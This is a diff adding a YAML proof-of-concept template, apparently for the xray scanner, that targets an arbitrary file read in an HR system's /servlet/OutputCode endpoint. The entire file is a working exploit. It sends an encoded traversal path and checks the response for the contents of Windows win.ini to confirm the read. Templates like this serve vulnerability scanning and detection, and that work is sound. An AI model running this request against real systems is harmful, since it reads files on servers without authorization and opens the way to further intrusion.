@@ -1,0 +1,22 @@
+name: poc-yaml-HJeHR-OutputCode-File-reading
+transport: http
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /servlet/OutputCode?path=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT 
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close 
+
+    expression: response.status == 200 && response.body.bcontains(b'; for 16-bit app support') && response.body.bcontains(b'[fonts]')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139114809
+
+
+
